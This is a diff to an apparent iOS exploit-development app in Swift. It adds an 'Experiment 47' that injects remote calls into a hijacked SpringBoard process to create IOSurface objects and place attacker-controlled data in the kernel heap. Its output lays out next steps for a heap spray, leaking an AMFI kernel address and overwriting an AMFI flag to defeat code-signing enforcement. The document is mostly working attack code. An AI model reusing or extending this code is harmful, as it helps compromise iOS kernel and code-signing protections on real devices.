@@ -422,10 +422,16 @@ struct AMFIExperimentView: View {
             
             // ============================================
             // 🔥 Experiment 46: IOSurface Property KRW
-            // Use IOSurface properties to access different kernel zone!
             // ============================================
             let exp46 = self.expIOSurfacePropertyKRW(rc: rc)
             experimentResults.append(exp46)
+            
+            // ============================================
+            // 🔥 Experiment 47: IOSurface from SpringBoard
+            // SpringBoard HAS IOSurface entitlement!
+            // ============================================
+            let exp47 = self.expIOSurfaceFromSB()
+            experimentResults.append(exp47)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -2726,6 +2732,114 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅ IOSurface CREATED")
         return ExperimentResult(name: "🔥 IOSurface KRW", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// IOSurface from SpringBoard — SB has IOSurface entitlement!
+    /// Launchd can't create IOSurface but SpringBoard CAN (renders UI)
+    private func expIOSurfaceFromSB() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥 IOSurface (SpringBoard)", success: false, detail: "SpringBoard RC not available", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "IOSurface from SpringBoard context\n\n"
+        
+        // SpringBoard already has IOSurface loaded (it renders UI!)
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
+        let ioSetVal = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceSetValue"))
+        let ioCopyVal = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCopyValue"))
+        let ioGetID = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetID"))
+        let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
+        let ioLock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
+        let ioUnlock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
+        
+        detail += "IOSurfaceCreate: \(ioCreate != 0 ? "✅" : "❌")\n"
+        detail += "IOSurfaceSetValue: \(ioSetVal != 0 ? "✅" : "❌")\n"
+        detail += "IOSurfaceCopyValue: \(ioCopyVal != 0 ? "✅" : "❌")\n"
+        detail += "IOSurfaceGetID: \(ioGetID != 0 ? "✅" : "❌")\n"
+        detail += "IOSurfaceGetBaseAddress: \(ioGetBase != 0 ? "✅" : "❌")\n\n"
+        
+        guard ioCreate != 0 else {
+            detail += "IOSurface not available in SpringBoard either\n"
+            return ExperimentResult(name: "🔥 IOSurface (SpringBoard)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Create IOSurface from SpringBoard!
+        // Build CFDictionary with IOSurfaceAllocSize
+        let dict = RootExecutor.rcall(sb, "CFDictionaryCreateMutable", 0, 0, 0, 0)
+        
+        if dict != 0 {
+            let sizeAddr = mem + 0x1A00
+            sb[sizeAddr].setValue64(0x4000) // 16KB
+            let cfNum = RootExecutor.rcall(sb, "CFNumberCreate", 0, 4, sizeAddr) // kCFNumberSInt64Type
+            let keyStr = remote_alloc_str(sb, "IOSurfaceAllocSize")
+            let cfKey = RootExecutor.rcall(sb, "CFStringCreateWithCString", 0, keyStr, 0x600)
+            
+            if cfNum != 0 && cfKey != 0 {
+                RootExecutor.rcall(sb, "CFDictionarySetValue", dict, cfKey, cfNum)
+                
+                // CREATE SURFACE!
+                let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
+                detail += "IOSurfaceCreate: 0x\(String(format: "%llx", surface))\n"
+                
+                if surface != 0 {
+                    detail += "✅✅✅ IOSurface CREATED from SpringBoard! ✅✅✅\n\n"
+                    
+                    // Get surface ID
+                    let surfID = RootExecutor.rcall(sb, "IOSurfaceGetID", surface)
+                    detail += "Surface ID: \(surfID)\n"
+                    
+                    // Lock and get base address
+                    RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
+                    let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
+                    detail += "Base address: 0x\(String(format: "%llx", baseAddr))\n"
+                    RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
+                    
+                    // Try setting a property (this allocates in kernel heap!)
+                    let propKey = remote_alloc_str(sb, "DSPloit_Test")
+                    let cfPropKey = RootExecutor.rcall(sb, "CFStringCreateWithCString", 0, propKey, 0x600)
+                    
+                    // Create a CFData with controlled content
+                    let dataSize: UInt64 = 256
+                    let dataAddr = mem + 0x1800
+                    // Fill with marker
+                    for i in stride(from: 0, to: Int(dataSize), by: 8) {
+                        sb[dataAddr + UInt64(i)].setValue64(0x4141414142424242)
+                    }
+                    let cfData = RootExecutor.rcall(sb, "CFDataCreate", 0, dataAddr, dataSize)
+                    
+                    if cfPropKey != 0 && cfData != 0 {
+                        // SET PROPERTY — this allocates in kernel!
+                        RootExecutor.rcall(sb, "IOSurfaceSetValue", surface, cfPropKey, cfData)
+                        detail += "Property set! (256 bytes in kernel heap)\n"
+                        
+                        // COPY PROPERTY back — verify it works
+                        let readBack = RootExecutor.rcall(sb, "IOSurfaceCopyValue", surface, cfPropKey)
+                        detail += "Property read back: 0x\(String(format: "%llx", readBack))\n"
+                        
+                        if readBack != 0 {
+                            detail += "✅ IOSurface property R/W WORKS!\n\n"
+                            detail += "NEXT STEPS:\n"
+                            detail += "1. Spray many properties to fill kernel heap\n"
+                            detail += "2. Free some → create holes\n"
+                            detail += "3. Trigger AMFI global alloc into hole\n"
+                            detail += "4. Use property read to leak AMFI address\n"
+                            detail += "5. Use overlapping alloc to overwrite AMFI flag\n"
+                        }
+                    }
+                    
+                    RootExecutor.rcall(sb, "free", propKey)
+                } else {
+                    detail += "❌ IOSurfaceCreate returned NULL from SpringBoard too\n"
+                    detail += "Might need different dictionary keys (width/height/pixelFormat)\n"
+                }
+            }
+            RootExecutor.rcall(sb, "free", keyStr)
+        }
+        
+        let success = detail.contains("✅✅✅")
+        return ExperimentResult(name: "🔥 IOSurface (SpringBoard)", success: success, detail: detail, timestamp: Date())
     }
     
     /// Sysctl approach: find and use CS-related sysctls
